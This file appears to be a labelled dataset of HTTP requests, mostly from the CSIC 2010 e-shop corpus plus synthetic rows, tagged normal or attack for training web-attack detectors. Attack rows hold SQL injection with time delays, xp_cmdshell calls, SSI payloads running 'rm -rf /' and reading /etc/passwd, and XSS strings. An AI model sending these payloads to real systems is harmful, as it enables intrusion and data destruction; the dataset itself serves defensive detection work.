+GET /tienda1/publico/autenticar.jsp?modo=entrar&loginA=ginsberg&pwd=e23am%21pa83r&remember=on&B1=Entrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=gavens0&password=revirado&nombre=Kaya&apellidos=Mojeda+Batet&email=munshin%40cirugiaplasticacordoba.hk&dni=65532112Y&direccion=Plaza+Flauta+16%2C+1%3FB&ciudad=Valdeavellano+de+Tera&cp=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&provincia=Teruel&ntc=2452355001922764&B1=Registrar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombreA=Vino+Rioja&precio=39&cantidad=40&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=celso&pwd=desvarar&remember=on&B1=Entrar%22+AND+%221%22%3D%221,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=carmelo&pwd=pREcis*A&remember=off&B1A=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=3027&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombreA=Queso+Manchego&precio=39&cantidad=19&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=ann-hoon&password=m86uca&nombre=Bertolda&apellidos=Leuco+Vilca&email=collinson_butarinski%40fernandosoto.il&dni=37156228G&direccion=Calle+Alqueria+De+Aznar+166+&ciudad=Salinas+de+Oro&cp=47209&provincia=Cantabria&ntc=2615220846617019&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=tesa&password=67a7d1lent9&nombre=Abril&apellidos=Maestrazgo+Gomis&email=lowenadler%40videoerotic.fm&dni=83454293N&direccion=C%2F+Los+Frutos%2C+57%2C+&ciudad=Pedernoso%2C+El&cp=02510&provincia=Albacete&ntc=7402631595178179&B1=Registrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=3415&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=mcnair&pwd=81cob6r&remember=off&B1A=Entrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=raymona&password=8ho0l2&nombre=Torcuarto&apellidos=Pompa&email=maksimovic%40gafasdesol.nom.gl&dni=48748000Y&direccion=Port+Fangos%2C+183%2C+&ciudad=Cualedro&cp=31153&provincia=Granada&ntc=9528500439395561&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=cadtools&pwdA=hirco&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=6244&B1=Pasar+por+caja%2F,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=%3F&precio=5832&B1=Pasar+por+caja,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=8759&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=%4040&precio=85&cantidad=22&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&loginA=carolyne&password=1%F35i7am41t0&nombre=Ram%F3n&apellidos=Chambueta+Deben&email=mangini%40cubiertoscbb.an&dni=10042805Q&direccion=Calle+Falconera%2C+173+&ciudad=Trefacio&cp=31227&provincia=Salamanca&ntc=1976494121699035&B1=Registrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=ke%2B%3Fv%3Fen&pwd=COnSO0atiVO&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/publico/entrar.jsp BODY: errorMsg=%4040,attack,csic2010
+GET /search?comment=images/logo.png,normal,synthetic
+GET /tienda1/miembros/editar.jsp?modo=registro&login=purgerso1&password=faci59ado&nombre=Alegr%EDa&apellidos=R%E1bano+Chaves&email=engh-stritzel%40normatic-vending.lv&dni=47939000P&direccion=Charca+Verde+165%2C+&ciudad=Medina+del+Campo&cp=25245&provincia=Pontevedra&ntc=3920119286282198&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=chance&pwd=agreza&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=18&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombreA=Vino+Rioja&precio=100&cantidad=35&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=yuanshin2&pwd=pOnDerADO&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=dimitri&password=h8rn3a7A&nombre=Argimiro&apellidos=Mideros+Col%EDn&email=devlin_lazar%40joyaseleccion.tk&dni=33594876H&direccion=Calle+Casa+Mohina+84%2C+11A&ciudad=Milano%2C+El&cp=50619&provincia=Ja%E9n&ntc=3333649049952888&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=louise&password=d%E1nica&nombre=Lara&apellidos=Barot+Holm&email=quilley0%40frenchpolynesia.com.st&dni=80135646N&direccion=Avinguda+Carrilet%2C+21%2C+&ciudad=Torres+de+la+Alameda&cp=50529&provincia=Cuenca&ntc=2796348455963884&B1=Registrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=5856&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=44&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=von_ende6&password=2er9rqu5a&nombre=Set-cookie%253A%2BTamper%253D1041264011025374727&apellidos=Nebot+Curell&email=vadis%40clubdegolf.com.gf&dni=05120273J&direccion=C%2F+Guardia+Civil+181+10%3FE&ciudad=Albal%E1&cp=42107&provincia=Guadalajara&ntc=6734713412721708&B1=Registrar,attack,csic2010
+POST /view BODY: name=<script>alert(1)</script>,attack,synthetic
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=marlsela&pwd=papero&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/miembros/imagenes/castro.jpg.inc,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=onder&passwordA=cORT%E9SMenTE&nombre=Pancracio&apellidos=Joves+Sagreras&email=darcy%40risiberia.gr&dni=20934634B&direccion=Avenida+Deportes+35+&ciudad=Santa+Croya+de+Tera&cp=13326&provincia=Zaragoza&ntc=7238071991283064&B1=Registrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=chancey&password=cl%EDba22&nombre=Em%E9rito&apellidos=Lentisco+Moyo&email=maunder%40eyewear.nom.coop&dni=03995650K&direccion=C%2F+Vives+De+Ca%F1amas+52+1%3FG&ciudad=Garrucha&cp=41360&provincia=Navarra&ntc=6577380187990722&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=mccarron&passwordA=revistero&nombre=Adelqui&apellidos=Valente+Sanchis&email=gargen%40007tv.zw&dni=83296238J&direccion=C%2F+Fuente+Morena%2C+146%2C+&ciudad=Rillo&cp=17752&provincia=Lleida&ntc=3359754319393302&B1=Registrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&login=keefer&password=ma2e32&nombre=Cayo&apellidos=Acosa&email=vallalonga%40943.pf&dni=57500602G&direccion=Plza.+Amor+De+Dios%2C+98%2C+13E&ciudad=Alf%E0s+del+Pi%2C+l%27&cp=34240&provincia=Cantabria&ntc=3147683283735999&B1=Registrar,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=petree&pwd=t6R551eRo&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=brightwe&password=Per8eBiMie0TO&nombre=Bardo&apellidos=Furnari+Pentinat&email=baxley%40italianmotorvillagesevilla.sh&dni=43962447V&direccion=C%2F+Coronel+Cervi%F1o+Nu%F1ez%2C+35+3-C&ciudad=Llinars+del+Vall%E8s&cp=08181&provincia=Ourense&ntc=0949927790340653&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=linnell&password=9OAUtoRa&nombre=Orieta&apellidos=Coch+Soto&email=zilzer%40foreignoffice.fo&dni=75022145D&direccion=C%2F+Gomera+148+3%3FE&ciudad=Cabolafuente&cp=45280&provincia=Tarragona&ntc=3549373062406547&B1=Registrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Queso+Manchego&precio=39&cantidad=97&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=6071%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Confirmar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=56&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=croiseti&pwd=c%3Fidiana&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=2814&B1=Pasar+por+caja%2F,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Vino+.*%3FRioja&precio=100&cantidad=84&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Vino+Rioja&precio=85&cantidad=78&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=1984&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=daley&password=crEa5o9&nombre=Leopoldo&apellidos=Malibr%E1n+Forn%E9s&email=dupreyon%40spainpharma.ck&dni=54773961J&direccion=Calle+De+Robert+Gerhard%2C+63+9%3FC&ciudad=Puig-reig&cp=04880&provincia=Salamanca&ntc=6440071898700767&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=marquez6&pwd=emBrocA&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=kapil&password=d1c36o4ca&nombre=Berina+del+Valle&apellidos=Artico&email=meunier.langa%40tintasultravioleta.al&dni=17826694S&direccion=C%2F+Historiador+Rodrigo+Pertegas%2C+149%2C+8-E&ciudad=Palafolls&cp=25218&provincia=C%E1ceres&ntc=3256313581077416&B1A=Registrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=4787&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=92&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=12&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=vicheara&password=disim%E9trica&nombreA=Yilda&apellidos=Rafi+Guisset&email=ferrold%40kimkardashian.com.gq&dni=89168818A&direccion=Pasaje+Ensenada%2C+100%2C+13%3FB&ciudad=Figueruela+de+Arriba&cp=40540&provincia=Madrid&ntc=0275568897070170&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=ynes&password=e46ola5&nombre=Judas&apellidos=Plans+Baquerizo&email=nolen%40enmenorca.com.th&dni=11800455Y&direccion=Plaza+Benidorm+155%2C+5%3FE&ciudad=Tramaced&cp=31830&provincia=Huesca&ntc=3545698437367747&B1=Registrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&cantidad=85&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39%2F&cantidad=71&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Vino+Rioja&precioA=85&cantidad=21&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/imagenes~,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=warun&password=PaLoTeO&nombre=Regis&apellidos=Deudor+Ortodo&email=salvador%40bijoubijoudiferente.ec&dni=09115235J&direccion=Avda.+Monaste%2Br%2Bio+D*e+Huelgas+32%2C+4%3FC&ciudad=Santa+Maria+d%27Ol%F3&cp=18518&provincia=Palencia&ntc=9339123760594436&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=5698&B1=Confirmar%2F,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=ferrao&password=instruta&nombre=Quirino&apellidos=Ribas+Flo&email=yung.valentini8%40canariasatuaire.ye&dni=47913001E&direccion=C%2F+Fitoria%2C+78+6%3FB&ciudad=Altarejos&cp=37494&provincia=Vizcaya&ntc=0742070586950762&B1=Registrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modoA=insertar&precio=2681&B1=Pasar+por+caja,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=rygwalsk&password=ve50able&nombre=Francisco&apellidos=Pallares+Milara&email=gozzi%40encuentrodominios.at&dni=51556666G&direccion=Pl.+Banco+196%2C+7G&ciudad=Corrales&cp=03187&provincia=La+Rioja&ntc=3169451354292215&B1=%27INJECTED_PARAM,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=rubetta&pwd=belE.sA&remember=off&B1=Entrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=de_anda&password=QuIJar&nombre=Cecilio&apellidos=Toso&email=lap-pun2%40streaptease.hk&dni=66226006J&direccion=Repeso+27%2C+&ciudad=Fiscal&cp=47361&provincia=Burgos&ntc=7676907583941560&B1=Registrar,normal,csic2010
+POST /download BODY: file='; eXeC xp_CMdShELL('diR');--,attack,synthetic
+GET /tienda1/publico/registro.jsp?modo=registro&login=torrin&password=villero&nombre=Amandio&apellidos=Rusi%F1ol+Camps&email=carton-haake%40palodegolf.com.af&dni=37712313H&direccion=Passeig+Sant+Joan+Bosco+22%2C+12%3FG&ciudad=Santa+Coloma+de+Cervell%F3&cp=40200&provincia=%C1lava&ntc=1134011255413195&B1A=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=21&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=dorothy&password=caTEyA&nombre=Helvetia&apellidos=Primo+Abell%E0&email=adix_adam%40easyviaggio.com.km&dni=12850084F&direccion=Santa+Cruz+175%2C+3%3FE&ciudad=Almendral+de+la+Ca%F1ada&cp=33456&provincia=Teruel&ntc=8174829886059602&B1=Registrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Queso+Manchego&precio=39&cantidad=52&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=sherwin&password=20BRecOrs%E9&nombre=Jeanette&apellidos=Aguilar+Sanz&email=seth%40expofloralzaragoza2014.tz&dni=88705967G&direccion=Calle+Eduardo+Urosa+105%2C+&ciudad=Buberos&cp=08800&provincia=Santa+Cruz+de+Tenerife&ntc=6977232709193068&B1=Registrar,normal,csic2010
+POST /contact BODY: page=%22%3E%3CSCrIpT%3EAleRT%28DocUMEnT.DOMain%29%3C/sCripT%3E,attack,synthetic
+GET /tienda1/miembros/editar.jsp?modo=registro&login=nagy4&password=1al6uiria&nombre=Zaquiel&apellidos=Cabarr%FAs+Zaf%F3n&email=strom.mahieuy4%40karldeux.ac&dni=63829565B&direccion=C%2F+La+Paloma%2C+32+12-A&ciudad=Rub%ED+de+Bracamonte&cp=18567&provincia=Girona&ntc=6820667917309161&B1=Registrar,normal,csic2010
+GET /products?q=please delete my old post,normal,synthetic
+GET /tienda1/miembros/editar.jsp?modo=registro&login=radick&password=aleve&nombre=Par%EDs&apellidosA=Teruel+Illarraga&email=cawdon%40programaciones.com.gg&dni=41955080K&direccion=C%2F+San+Jose+121%2C+11%3FD&ciudad=Holguera&cp=43894&provincia=Granada&ntc=8674124405846467&B1=Registrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=mo%2Brson&password=c44dE96&nombre=Orestes&apellidos=Amargant&email=el2%40campanasextractoras.py&dni=57728968A&direccion=Calle+Salado%2C+148%2C+6%3FF&ciudad=Valderrobres&cp=16236&provincia=Girona&ntc=1272142225716686&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=2300&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=szaplonc&password=69asp16&nombre=Santiago&apellidos=Lledo&email=val%40uniovivirtual.uy&dni=90463927M&direccion=Miguel+Hernandez+2+10%3FH&ciudad=Sant+Esteve+de+Palautordera&cp=05960&provincia=Burgos&ntc=8036994559914717&B1=Registrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Queso+Manchego&precio=100&cantidad=1&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modoA=insertar&precio=5934&B1=Confirmar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=keen&password=583no&nombre=Cibeles&apellidos=Raja+Villalba&email=backes%40kimkardashian.com.lk&dni=86064216X&direccion=Amann+132+&ciudad=Garrafe+de+Tor%EDo&cp=49167&provincia=Valladolid&ntc=1894425536151221&B1=Registrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=cyndi&password=suBurbICaRIo&nombre=Quimey&apellidos=M%FAzquiz+Metauten&email=mars%40visualreality.au&dni=05744913L&direccion=Urbaniz*acio%2Bn+Aguere+192%2C%2B+&ciudad=Orba&cp=40180&provincia=Cantabria&ntc=9263586426997442&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=1515&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=kortekaa&pwd=7aria&remember=off&B1=Entrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=core&pwd=457l0%EDm3t46&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/caracteristicas.jsp?id=1,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Queso+Manchego&precio=100&cantidad=13&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico.bak,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=%253F&password=su5a&nombre=Rogato&apellidos=Cucarell+Caridad&email=zmed%40tabernarinconete.uk&dni=19477061V&direccion=Manuel+Paez+Xaramillo+33%2C+6B&ciudad=Estella%2FLizarra&cp=26321&provincia=Tarragona&ntc=9995470732934706&B1=Registrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=7301&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=bergland&pwd=85amo&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=kenn&pwd=p6o2%F3n&remember=on&B1=Entrar,normal,csic2010
+GET /download?q=alice@example.com,normal,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=fricker&password=a0u43875&nombre=Celinda&apellidos=Mecklenburg+Balaguera&email=thoeren%40comercioenlacalle.me&dni=71625075Q&direccion=Travesia+Era+151+11F&ciudad=Domingo+Garc%EDa&cp=15350&provincia=Cantabria&ntc=5505928898200135&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=rahmani&password=decimon4na&nombre=Jorge&apellidos=Morande&email=dawson%40eco-pro.to&dni=37871926B&direccion=Calle+Archiduque+Carlos%2C+97+9%3FG&ciudad=Vilassar+de+Mar&cp=01212&provincia=Burgos&ntc=5287631327187373&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=chi-yin&password=zAfIo&nombre=Amael&apellidos=Casselle+Cullell&email=vacey%40madrid2012.kw&dni=70541156H&direccion=Plza.+Agueda+Diez%2C+25+10%3FB&ciudad=Oria&cp=19415&provincia=Cantabria&ntc=%2520&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=adriaans&password=desl%E1nguido&nombre=Patrocinia&apellidos=Mas+Suy&email=unicorn%40devuelos.ru&dni=36844743P&direccion=Calle+Ondara+38+3%3FB&ciudad=Ayala%2FAiara&cp=33785&provincia=Ja%E9n&ntc=2773760361934334&B1A=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=7622&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=4697&B1=Confirmar,normal,csic2010
+GET /search?name=<sVg onloAD=ALerT(1)>,attack,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=malethia&password=T3%D1ue31&nombre=Graciano&apellidos=Berni+Aizpuru&email=merida%40elsentidodelavida.nc&dni=60516960G&direccion=Paseo+Alberto+Palacios%2C+61%2C+&ciudad=Puerto+de+Santa+Cruz&cp=45112&provincia=Valencia&ntc=7062837084411016&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=4110&B1=Pasar+por+caja%2F,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=47&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=1608&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=gen%2F%2Fnie&pwd=circunfuso&remember=on&B1=Entrar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=swartz&pwd=taN640&remember=off&B1=Entrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=spyros&password=POsTreMERa&nombre=Quinciano&apellidos=Joseph+Repizo&email=coogan-puente%4019horas.ge&dni=15662869F&direccion=C%2Fja+Ciegos+S%2FN+5%3FD&ciudad=Viana+do+Bolo&cp=26312&provincia=Huelva&ntc=8021682596257423&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=lonidas&password=FUNDaMEntaLmENtE&nombre=Felipa&apellidos=Ju%E1rez&email=sarcey-fendel%40gesmahernan.de&dni=98918059G&direccion=Calle+Cosidores%2C+S%2FN%2C+&ciudad=Capileira&cp=47690&provincia=Navarra&ntc=6160253696929665&B1=Registrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Vino+Rioja&precio=39&cantidad=73&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=1%2F&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=69&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=bronec&pwd=sup9608t650&remember=on&B1=Entrar,normal,csic2010
+GET /profile?email=laptop,normal,synthetic
+GET /tienda1/miembros/editar.jsp?modo=registro&login=ghossein&password=8i0l%ED2&nombre=Anael&apellidos=Febrer+Pedrouzo&email=arpad4%40emepleo.lr&dni=90658868K&direccion=C%2F+Astilleros%2C+129%2C+&ciudad=Tei%E0&cp=50100&provincia=Zaragoza&ntc=3186627053603991&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=beal&pwd=infalibilidad&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=robieux&pwd=cuatriduana&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=zeigler&pwd=7ERVAnT0F2La&rememberA=off&B1=Entrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=soussa&password=claRucha&nombre=Eranio&apellidos=Antonell+Ferriani&email=forsyne%40velaconsultores.mx&dni=00915989Z&direccion=Calle+La+Merce%2C+120+&ciudad=Zarzosa+de+R%EDo+Pisuerga&cp=14970&provincia=Valencia&ntc=6048168713695182&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=5756&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=dane&pwd=e3970iv4r&remember=on&B1A=Entrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=1152&B1=Pasar+por+caja,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=neils&password=M974or5S2&nombre=Silvio&apellidos=Servitje+Areggiani&email=rocheman%40sindns.er&dni=53527134Q&direccion=Ca%F1ada+De+Los+Ingleses%2C+117%2C+&ciudad=Cantoria&cp=20110&provincia=A+Coru%F1a&ntc=1059842916427607&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=elisha&password=borracho&nombre=Ele%E1zaro&apellidos=Morlanes+Funosa&email=gilda6%40mytanga.om&dni=32159249M&direccion=Raixa+S%2FN+&ciudad=Aguilar+de+Bureba&cp=07650&provincia=Castell%F3n&ntc=1399422098640864&B1=Registrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=64&B1=A%F1adir+al+carrito%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,attack,csic2010
+GET /login?user=Tom & Jerry,normal,synthetic
+GET /tienda1/publico/registro.jsp?modo=registro&login=urbanowi&password=cl5m9&nombre=Mairena&apellidos=Sig%FCenza+Mosconi&email=pious-muszte9%40prestigecars.sg&dni=83609975F&direccion=Palomares%2C+2+11B&ciudad=Villamuelas&cp=17240&provincia=Burgos&ntc=7869918811946914&B1=Registrar,normal,csic2010
+GET /search?q=%3CSVg%20onLOAD%3DALeRt%281%29%3E,attack,synthetic
+GET /tienda1/miembros/editar.jsp?modo=registro&login=prodmgmt&password=lam%21er&nombre=Venancio&apellidos=Grimaldi+Escriva&email=herrier%40matchball.com.pf&dni=13833753N&direccion=Portassa%2C+30%2C+1-A&ciudad=Huerta+de+Arriba&cp=16371&provincia=Barcelona&ntc=8602335682420323&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=yansun&pwd=%27emBOb%2Ca-%27Miento&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=4396&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=13&B1=A%F1adir+al+carrito,normal,csic2010
+POST /download BODY: page=O'Brien,normal,synthetic
+GET /tienda1/miembros/imagenes/zarauz.jpg/asf-logo-wide.gif,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=2759&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=yale&pwd=d%2Fesp%2FepI%27Tar&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Vino+Rioja&precio=100&cantidad=89&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=1%2F&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=75&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=toshach&pwdA=qUeR4N55a&remember=off&B1=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=8318&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=5537&B1=Confirmar,normal,csic2010
+GET /search?file=admin,normal,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=zuzana&password=aSAcaDORA&nombre=B%E1rbara&apellidos=Longstaff+Elecciones&email=kemr%40soycatalan.ga&dni=44251271F&direccion=Calle+San+Sebastian%2C+154+13D&ciudad=Cobe%F1a&cp=40467&provincia=Sevilla&ntc=7828706714204414&B1=Registrar,normal,csic2010
+GET /search?page=cheap flights,normal,synthetic
+GET /tienda1/miembros/editar.jsp?modo=registro&login=antone&password=7a4an4e&nombre=Elpidio&apellidos=Chocano+Paramo&email=orchard%40palomajimenez.so&dni=35314545T&direccion=C%2F+Los+Mineros+1%2C+&ciudad=Navaconcejo&cp=10660&provincia=Pontevedra&ntc=2558545383527310%2B&B1=Registrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=rosche7&password=ber269U31a&nombre=Veneranda&apellidos=Ibero+Saborit&email=taneda%40ajuntamentdebcn20.be&dni=27415264T&direccion=C%2F+1+Sur+S%2FN+12%3FG&ciudad=Millana&cp=44366&provincia=Navarra&ntc=3796618492569421&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precioA=1784&B1=Pasar+por+caja,attack,csic2010
